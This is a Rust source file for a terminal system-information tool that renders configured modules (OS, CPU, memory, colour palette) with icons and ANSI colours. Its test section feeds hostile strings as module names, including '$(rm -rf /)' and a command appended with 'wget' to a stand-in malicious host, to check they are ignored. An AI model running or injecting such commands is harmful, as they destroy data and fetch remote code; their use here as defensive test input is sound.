use crate::config::{Config, ModuleConfig};
use crate::info::Info;

#[derive(Debug)]
pub enum RenderNode {
    Line { key: String, value: String, icon: String },
    Group { title: String, children: Vec<RenderNode> },
}

pub fn prepare_render_tree(info: &Info, modules: &[ModuleConfig], config: &Config) -> Vec<RenderNode> {
    let mut nodes = Vec::new();
    for module in modules {
        match module {
            ModuleConfig::Simple(key) => {
                if key == "palette" {
                    let val = format_palette(config);
                    // Icon for palette is optional, can be "Colors" or empty string if user wants no icon
                    let icon = config.icons.get(key).cloned().unwrap_or("🎨".to_string());
                    nodes.push(RenderNode::Line { key: key.clone(), value: val, icon });
                } else {
                    let val = get_module_value(info, key);
                    if let Some(v) = val {
                        let icon = config.icons.get(key).cloned().unwrap_or("●".to_string());
                        nodes.push(RenderNode::Line { key: key.clone(), value: v, icon });
                    }
                }
            },
            ModuleConfig::Group { title, modules } => {
                let children = prepare_render_tree(info, modules, config);
                if !children.is_empty() {
                    nodes.push(RenderNode::Group { title: title.clone(), children });
                }
            }
        }
    }
    nodes
}


fn get_module_value(info: &Info, key: &str) -> Option<String> {
    match key {
        "os" => Some(info.os.clone()),
        "kernel" => Some(info.kernel.clone()),
        "hostname" | "host" => Some(info.host_name.clone()),
        "wm" => Some(info.desktop.clone()),
        "packages" => Some(info.packages.clone()),
        "shell" => Some(info.shell.clone()),
        "cpu" => Some(info.cpu.clone()),
        "gpu" => {
            if info.gpu.is_empty() { Some("Unknown".to_string()) }
            else { Some(info.gpu.join(" / ")) }
        },
        "memory" => Some(info.memory.clone()),
        "swap" => Some(info.swap.clone()),
        "disk" => {
             if info.disks.is_empty() { Some("Unknown".to_string()) }
             else { Some(info.disks[0].clone()) } // Simplified
        },
        "battery" => Some(info.battery.clone()),
        "uptime" => Some(info.uptime.clone()),
        "terminal" => Some(info.terminal.clone()),
        "user" => Some(info.user.clone()),
        "datetime" => Some(info.datetime.clone()),
        "local_ip" => Some(info.local_ip.clone()),
        "palette" => None, // Handled in prepare_render_tree
        "header" => Some(format!("{}@{}", info.user, info.host_name)), // Custom module for header
        "sep" => Some("---".to_string()),
        _ => None,
    }
}

fn format_palette(config: &Config) -> String {
    let style = config.palette_style.as_deref().unwrap_or("squares");
    let mut s = String::new();
    
    // ANSI color codes (0-7 correspond to 30-37 fg, 40-47 bg)
    let colors = [0, 1, 2, 3, 4, 5, 6, 7];
    
    match style {
        "squares" => {
            for c in colors {
                s.push_str(&format!("\x1b[{}m  \x1b[0m ", c + 40));
            }
        },
        "circles" => {
            for c in colors {
                s.push_str(&format!("\x1b[{}m●\x1b[0m ", c + 30));
            }
        },
        "triangles" => {
            for c in colors {
                s.push_str(&format!("\x1b[{}m▲\x1b[0m ", c + 30));
            }
        },
        "lines" => {
            for c in colors {
                s.push_str(&format!("\x1b[{}m███\x1b[0m", c + 30));
            }
        },
        _ => {
             for c in colors {
                s.push_str(&format!("\x1b[{}m  \x1b[0m ", c + 40));
            }
        }
    }
    s
}


//tests
#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::Config;
    use crate::info::Info;

    // As default or new.
    #[test]
    fn test_prepare_render_tree_empty() {
        let info = Info::new();
        let config = Config::default();
        let modules = vec![];
        
        let nodes = prepare_render_tree(&info, &modules, &config);
        assert!(nodes.is_empty());
    }

    #[test]
    fn test_security_malicious_module_injection() {
        let info = Info::new();
        let config = Config::default();
        
        // Cybersec: test malicious module injection
        let malicious_modules = vec![
            ModuleConfig::Simple("$(rm -rf /)".to_string()),
            ModuleConfig::Simple("eval('malware')".to_string()),
            ModuleConfig::Simple("os_name; wget http://malicioso.com".to_string()),
            ModuleConfig::Simple("A".repeat(10_000)), // Prueba contra desbordamientos
        ];
        
        let nodes = prepare_render_tree(&info, &malicious_modules, &config);
        
        assert!(nodes.len() <= malicious_modules.len());
    }
}